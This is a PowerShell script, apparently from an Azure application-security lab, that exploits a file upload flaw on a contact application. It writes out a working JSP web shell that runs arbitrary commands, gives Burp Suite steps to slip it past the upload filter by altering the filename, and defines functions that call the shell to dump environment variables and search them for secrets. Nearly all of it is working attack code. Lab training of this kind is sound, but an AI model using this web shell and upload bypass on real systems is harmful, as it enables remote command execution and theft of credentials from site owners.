# Learning Objective 9: Exploit File Upload vulnerability in contact application
# This script uses Burp Suite to bypass file upload restrictions and extract info
# Author: rfs85

# Note: This script demonstrates the concept but requires manual Burp Suite interaction

# 1. Download and prepare the JSP web shell
$webShellPath = "C:\AzAppsec\Tools\studentx.jsp"
$webShellContent = @'
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
'@

# Save the web shell to disk if it doesn't exist
if (-not (Test-Path $webShellPath)) {
    $webShellContent | Out-File -FilePath $webShellPath -Encoding ASCII
    Write-Host "Created JSP web shell at $webShellPath"
}

# 2. Manual instructions for Burp Suite interception
Write-Host @"
File Upload Exploitation Instructions:

1. Start Burp Suite and configure browser to use it as proxy
2. Navigate to https://contactpharmacorp.azurewebsites.net/upload
3. Select the JSP web shell file ($webShellPath) for upload
4. When Burp intercepts the request, send it to Repeater
5. Modify the filename in the "name" parameter by adding an escape character:
   Change "studentx.jsp" to "studentx.js\p"
6. Send the modified request
7. Check if the file was uploaded successfully

Once uploaded, access the web shell:
- URL: https://contactpharmacorp.azurewebsites.net/studentx.jsp
- Use parameter "?cmd=cmd.exe /c set" to list environment variables
- Look for any sensitive information in the environment variables
"@

# 3. Script to check if the web shell is accessible (run after manual upload)
function Test-WebShellUpload {
    param (
        [string]$url = "https://contactpharmacorp.azurewebsites.net/studentx.jsp",
        [string]$cmd = "cmd.exe /c hostname"
    )
    
    try {
        $response = Invoke-WebRequest -Uri "$url?cmd=$cmd" -UseBasicParsing
        if ($response.StatusCode -eq 200) {
            Write-Host "Web shell is accessible!"
            Write-Host "Command output:"
            Write-Host $response.Content
            return $true
        }
    }
    catch {
        Write-Host "Web shell is not accessible: $_"
        return $false
    }
}

# 4. Script to extract environment variables (run after confirming web shell works)
function Get-EnvironmentVariables {
    param (
        [string]$url = "https://contactpharmacorp.azurewebsites.net/studentx.jsp"
    )
    
    try {
        $response = Invoke-WebRequest -Uri "$url?cmd=cmd.exe /c set" -UseBasicParsing
        if ($response.StatusCode -eq 200) {
            Write-Host "Environment variables:"
            Write-Host $response.Content
            
            # Look for interesting variables
            if ($response.Content -match "ADDITIONAL_ENDPOINT=(.*?)$") {
                $endpoint = $matches[1]
                Write-Host "Found additional endpoint: $endpoint"
            }
        }
    }
    catch {
        Write-Host "Failed to get environment variables: $_"
    }
}

# Uncomment and run after manual upload steps
# Test-WebShellUpload
# Get-EnvironmentVariables